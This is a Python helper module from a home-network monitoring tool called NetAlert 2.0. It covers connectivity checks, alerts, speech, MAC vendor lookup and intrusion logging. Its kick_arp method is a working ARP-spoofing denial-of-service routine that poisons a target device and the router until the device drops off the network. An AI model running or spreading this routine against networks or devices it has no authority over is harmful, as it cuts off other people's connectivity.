#   EXTRA FEATURES // NET ALERT 2.0






# UI IMPORTS
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.console import Console
console = Console()
console_width = console.size.width
import pyfiglet

# IMPORTS
import requests, time, os, socket
from plyer import notification
import pyttsx3, threading
from pathlib import Path
from datetime import datetime
import openai, random, pyttsx3


# NETWORK IMPORTS
from scapy.all import IP, send, UDP, ICMP, sr1flood, sr1, ARP, Ether, sendp, sendpfast, sniff


class connection_status():

    def __init__(self):
        self.first = True
        pass

    def connection_check(self):
        """Responsible for checking if local user is online & if not they will not be able to procceed further in the program!"""
        
        
        
        while True:

            try:
                # GET HOST NAME THEN / LOCAL IP ADDRESS
                host = socket.gethostname()
                host = str(host)
                local_ip = socket.gethostbyname(host)

                split = local_ip.split('.')
                split[2] = "xxx"        # CHANGING THE 3RD OCTET TO X'S
                split[3] = "xxx"        # CHANGING THE 4TH OCTET TO X'S 

                local_ip ='.'.join(split)  # JOINS THE SEPERATED GROUPS BACK TOGETHER

            # MESSAGE VARIABLES
                msg_offline = "Connection Status: Offline\nPlease Check Your Connection & Try Again!"
                msg = "Connection Status: ONLINE"
                
                # CHECKING INTERNET CONNECTIVITY 
                response = requests.get("http://google.com", timeout=1)
                code = response.status_code                        #   ONLINE / OFFLINE 


            # PANELS FOR OUTPUTS
                panel_on = Panel(f"CONNECTION STATUS: ONLINE\nLocal IP: {local_ip}\nHost Name: {host}", style="yellow on black", width=min(130, console_width - 2), expand=False, title="connection status")
                panel_off = Panel("CONNECTION STATUS: OFFLINE", style="red on black", border_style="bold red", width=min(130, console_width - 2), padding=(1, 2), expand=False)
                #panel_error = Panel(f"CONNECTION STATUS: OFFLINE (Error:  {e})", style="red on black", border_style="bold red")
                panel_leavin = Panel("Sorry To see you go hope to see you again soon", style="yellow on black", border_style="red", width=min(130, console_width - 2), expand=False)
                
            

                if code == 200:

                    console.print(panel_on)
                    if self.first:
                        self.first = False
                        def online():
                            letter = "Connection Status Online. Welcome To NetAlert"
                            utilities().tts(letter)
                        
                        t = threading.Thread(target=online, daemon=True)
                        t.start()
                    
                    break                    # EXITS THE LOOP IF SUCCESSFUL

                else:

                    console.print(panel_off)
                    if self.first:
                        self.first = False
                        def offline():
                            letter = "Connection Status Offline! Please check your connection & Try again."
                            utilities().tts(letter)
                        
                        t = threading.Thread(target=offline)
                        t.start()

                    console.input("[yellow]Press[/yellow] [green]Enter[/green] [yellow]to Re-Try[/yellow] [green]Connection[/green] or [red]Ctrl + c to exit[/red]: ")
                    
            

            # HANDLES DNS ERRORS AND NETWORK MISCONFIGURATIONS
            except socket.gaierror as e:   

                panel_socket = Panel(f"Failed To resolve Hostname / Local IP  {e}")            # ERROR PANEL
                console.print(panel_socket)
            
            

            # NETWORK RELATED ERRORS LIKE NO INTERNET
            except requests.exceptions.RequestException as e:   

                panel_error = Panel(f"CONNECTION STATUS: OFFLINE (Error: {e})", style="red on black", border_style="bold red")
                panel_error = Panel(f"CONNECTION STATUS: OFFLINE (Error: {e})", style="red on black", border_style="bold red")

            
                console.print(panel_error)
                console.input("[yellow]Press[/yellow] [green]Enter[/green] [yellow]to Re-Try[/yellow] [green]Connection[/green] or [red]Ctrl + c to exit[/red]: ")
            
          

         
            # THIS IS SO THE USER CAN EXIT GRACEFULLY INSTEAD OF BEING STUCK IN THE WHILE THRU LOOP // CUZ THERE INTERNET SUCKS // LOL
            except KeyboardInterrupt as e:

                console.print(panel_leavin)
                time.sleep(3)
                exit()
                error_log(e)

            
            # WILL HANDLE GENERAL EXCEPTION ERRORS
            except Exception as e:      

                panel_error = Panel(f"CONNECTION STATUS: OFFLINE (Error:  {e})", style="red on black", border_style="bold red")
                console.print(panel_error)
                console.input("[yellow]Press[/yellow] [green]Enter[/green] [yellow]to Re-Try[/yellow] [green]Connection[/green] or [red]Ctrl + c to exit[/red]: ")
            


class utilities():


    # FOR ARP CONTROLLER
    online = True
    watchlist = []


    def __init__(self):
        self.noty_counter = 0


        pass



    def clear_screen(self):
        """Clear Screen Command"""

        if os.name == "nt":
            os.system("cls")
        
        elif os.name == "posix":
            os.system("clear")
        
        else:
            print("This platform doesnt support clear screen command")
    
    
    def noty(self, msg):
        """Responsible for system notifications"""
        
        try:
            notification.notify(
                title = "NetAlert 2.0",
                app_name = "NetAlert 2.0",
                message = msg,
                timeout = 10
            )
        except Exception as e:
            console.print(f"Error sending notification: {e}")
    

    def tts(self, letter, voice_rate= 20):
        """Responsible for text to speech"""

        engine = pyttsx3.init()
        
        voices = engine.getProperty('voices')
        rate = engine.getProperty('rate')

        # SET VOLUME
       # volume = engine.getProperty('volume')
        
       
        
        try:
           # engine.setProperty('volume', 20)
            engine.setProperty('rate', rate - voice_rate)
           
        except Exception as e:
            console.print(e)
  

        if len(voices) > 1:
            engine.setProperty('voice', voices[1].id)
           # console.print("Voice set to 1")
        
        else:
            engine.setProperty('voice', voices[0].id)
           # console.print("voice set to 0")

        engine.say(letter)
        engine.runAndWait()
        
    

    def get_vendor(mac):
        """Pass mac address and will return vendor if found"""

        import requests
        import manuf

        try:
            
            url = f"https://api.macvendors.com/{mac}"

            response = requests.get(url, timeout=2)

            if response.status_code == 200:
                return response.text
            
            else:
                # FALL BACK TO GETTING MAC FROM PYTHON LIBARY // IN CASE OF RATE LIMITING ESPICIALLY
                vendor = manuf.MacParser().get_manuf_long(mac) 
                
                vendor = vendor if vendor else "Unknown"

                return vendor
      
        
        except requests.exceptions.ConnectTimeout as e:
            vendor = manuf.MacParser().get_manuf_long(mac)
            return vendor
        
        except Exception as e:
            console.print(e)
            vendor = manuf.MacParser().get_manuf_long(mac)
            return vendor
    

    def noty_count(self):
        """Responsible for keeping track of the amount of notifications sent so that way it isnt over run """

        self.noty_counter += 1


        if self.noty_counter == 60:
            self.noty_counter = 0

        elif self.noty_counter > 3:
            return False
        
        else:
            return True
        
        self.noty_counter



        
    
    
    @classmethod
    def arp_controller(cls, ip, leave=False, destroy=False, check=False, add=False):
        """This method will be responsible for controller kick_arp <-- """   

        # FOR ERRORS
        verbose = False


        
        # FOR KILLING ALL THREADS
        if destroy:
            cls.watchlist = []

            if verbose:
                console.print("cleaned watchlist")

                return


        # FOR REMOVING FROM WATCHLIST
        elif leave:
            cls.watchlist.remove(ip)

            if verbose:
                console.print(f"I am removed: {ip}")

            
            return 
    
        
        # FOR CHECKING IF THAT IP IS IN THE WATCHLIST
        elif check:

            if ip in cls.watchlist:

                if verbose:
                    console.print(f"im in the watchlist: {ip}")

                return True
            
            else:

                if verbose:
                    console.print(f"im NOT in the watchlist: {ip}")


                return False
        
        
        # FOR ADDING TO THE LIST
        elif add:

            if ip not in cls.watchlist:
                cls.watchlist.append(ip)

                if verbose:
                    console.print(f"i added: {ip}")
               
                return True
            
            # SKIP THIS INSTANCE
            else:
                return False




    def kick_arp(self, ip: str, mac: str, router_info: tuple, CONSOLE):
        """Responsible for disallowing unauthorized devices found on the network"""


        CONSOLE.print(f"[bold red]Poisoning:[/bold red] {ip} <---> {mac}")



        online = True
        packets_sent = 0
        total_packets = 0

        payload = b"Intrusion Detected, you are not allowed on the network" * 20

        packet_layer_3 = IP(src="192.168.1.1", dst=ip) / UDP(sport=1234, dport=80) / payload

        # LAYER 2 PACKET // ARP

        mac = mac.strip()
        

        # PULL ROUTER INFO
        ROUTER_IP = router_info[0].strip()
        ROUTER_MAC = router_info[1].strip()
        #router_mac = "4c:19:5d:15:76:8b"
       # CONSOLE.print("[bold green]Current Gateway: [/bold green]", ROUTER_IP, ROUTER_MAC)

        fake_mac = "00:12:ff:12:44:12"

        packet_layer_2 = Ether(src= fake_mac, dst=mac) / ARP(psrc=ROUTER_IP, pdst=ip, hwsrc= fake_mac, hwdst=mac) 
        packet_for_router = Ether(src=fake_mac, dst=ROUTER_MAC) / ARP(psrc=ip, pdst=ROUTER_IP, hwsrc=fake_mac, hwdst=ROUTER_MAC)

        # NOTIFY USER THAT THE ATTACK IS STARTING
        msg_start = f"Now launching a Denial-of-service attack on {ip}"
        #threading.Thread(target=utilities().tts, args=(msg_start,)).start()
        

        # KEEPS TRACK OF WATCHLIST
        if utilities.arp_controller(ip=ip, leave=False, add=True) == False:
            return


        while utilities.arp_controller(ip=ip, leave=False, destroy=False, check=True):

            sendp(packet_layer_2, verbose=False)
            sendp(packet_for_router, verbose=False)
            
            if packets_sent > 30000:

                ping = IP(dst=ip) / ICMP()
                
                # WAIT BEFORE PINGING TO SEE IF DEVICE CONNECTS BACK
                time.sleep(1)
                response = sr1(ping, timeout=5, verbose=False)
                total_packets += packets_sent
                

                # USE THIS INSTEAD TO KEEP THE LOOP GOING
                RESPONSE = True


                if response:
                    CONSOLE.print(f"Device: {ip} is still online resuming Denial-of-Service attack, Total Packets sent: {total_packets}")

                else:
                    
          
                    msg = f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} packets sent"
                    #utilities().tts(msg)
                    CONSOLE.print(f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} packets sent")
                   
                   # CREATE A THREAD RESPONSIBLE FOR KEEPING DEVICE DISCONNECTED
                    dhcp_monitor = dhcp_capture()  # Instantiate the class properly
                    sniff_thread = threading.Thread(target=dhcp_monitor.start, daemon=True)
                    sniff_thread.start()

                    online = False


                    utilities.arp_controller(ip=ip, leave=True)

                    return
            
                # RESPONSIBLE FOR KEEPING TRACK OFF TOTAL PACKETS SENT // RESTART PACKETS_SENT VARIABLE
                
                packets_sent = 0

            
           # print(f"Packets sent: {total_packets}", end='\r', flush=True)
            packets_sent += 1
    

        CONSOLE.print(f"[bold red]Background Thread: {ip} - [bold green]successfully killed")

    
    def kick_blacklist(self, vendor: str, host: str, ip: str, mac: str):
        """This method will be using // communicating directly with your local router"""
        
        try:
            if host == "N/A" and vendor == "Not availiable":
                option = f"with a ip address of: {ip}"
            
            elif host == "N/A":
                option = f"with a vendor from: {vendor}"
            
            else:
                option = f"with a hostname of: {host}"

            
            letter = f"Successfully blacklisted a device, {option}"
            utilities().tts(letter)
        
        except Exception as e:
            console.print(e)

    
# TEST CLASS // ONLY USED AS A OBJECT TO BE CALLED UPON FROM WITHIN THE UTILITIES CLASS INSIDE THE UNAUTHORIZED DEVICE HANDLER
class dhcp_capture():
    """Responsible for listening and capturing dhcp packets"""

    
    def dhcp_traffic(self, packet):
        """Responsible for intercepting and blocking dhcp traffic"""

        console.print("test print")
        
        try:
            if packet.haslayer("BOOTP"):

                mac = packet.hwsrc
                ip = packet.psrc

                console.print(f"Found Device:{ip} <--> {mac} trying to obtain a dhcp ip address!")
        
        except Exception as e:
            console.print(e)

            
    
    def start(self):
        """Launch the main method within this method"""

        console.print(f"\nNow Launching background thread to keep network secure\n")
        sniff(filter="udp and (port 67 or port 68)", prn= lambda packet: self.dhcp_traffic(packet), store=0)
        console.print("[bold red]END[/bold red]")


class Logging:
    """This class holds and stores any and all intrusions // detailed information on intrusions"""


    def __init__(self):

        # CREATE BASE DIRECTORY
        base_dir = Path.home() / "Documents" / "nsm tools" / ".data" / "NetAlert2" / "Intrusion_logging"
        base_dir.mkdir(parents=True, exist_ok=True)
        
        # CREATE METHOD FILE PATH // FOR LOG SAVING
        self.file_log = base_dir / "log_file.txt"
        

    def log_results_write(self, log, console = console):
        """Responsible for keeping up to date with intrusions found"""

        # LOOP SO THAT WAY FILE CAN BE CREATED AND RETRIED!!!
        while True:

            # CREATE TIMESTAMP FOR ACCURATE // DETAILED LOGGING
            now = datetime.now()
            time_stamp = now.strftime("%Y-%m-%d %H:%M:%S")

            # CREATE THE LOG FORMAT TO THEN BE SAVED
            log_format = f"Timestamp: {time_stamp} - {log}\n"
    
            try:

                with open(self.file_log, "a") as file:
                    file.write(log_format)
                    console.print("[bold green]Successfully logged[/bold green] [bold red]Intrusion![/bold red]")
                    break
            
            except FileNotFoundError as e:
                console.print(f"[bold red]{e}[/bold red]")
                #console.print("[bold green]Successuflly Created logging file pathway![/bold green]")
                
                # CREATE LOGGING FILE PATH SINCE IT WASNT FOUND
                with open(self.file_log, "w") as file:
                    file.write("[bold green]Welcome To NetAlert Intrusion Logging[/bold green]\n\n\n")
    

    def  log_results_read(self):
        """Responsible for pulling log results and outputting // returning them"""

        
        while True:
            try:
                with open(self.file_log, "r") as file:
                    content = file.read()
                    console.print(content)
                    break
    
            except FileNotFoundError as e:
                # CREATE LOGGING FILE PATH SINCE IT WASNT FOUND
                with open(self.file_log, "w") as file:
                    file.write("[bold green]Welcome To NetAlert Intrusion Log[/bold green]\n\n\n")
                console.print(f"[bold red]Logging File Path Successfully Created\n\n[/bold red]")
               # console.print("[bold blue]No File found meaning no intrusions![/bold blue]\n[bold green]Your Network has been Safetly Secured!!![/bold green]")

            except Exception as e:
                console.print(e)
                console.input("\n\n[bold red]Press enter to exit: [/bold red]")
                break      




class open_ai_intergration():
    """Will be using ai within this class"""

    def __init__(self):
        pass
    

    def start(self, prompt):
        """AI Responses"""
        
        try:
            openai.api_key = ("")

            # CREATE THE PROMPT NOW 
            response = openai.completions.create(
                model= 'gpt-3.5-turbo-instruct',
                prompt= prompt,
                max_tokens=150
            )
            
            # NOW TO RETURN AI'S RESPONSE
            return response.choices[0].text.strip()
        
        except Exception as e:
            console.print(e)
 
def main():
    import threading
    t = threading.Thread(target=utilities().tts("testing"))
    t.start()
    t.join()


        




if __name__ == "__main__":
   #while True:
   # start = utilities().tts(letter="Warning!!! 3 Unauthorized devices found on your network. Sending details to your phone.")
    # main()
    # console.print("toes are white")



    open_ai_intergration().start(prompt="how are you doing")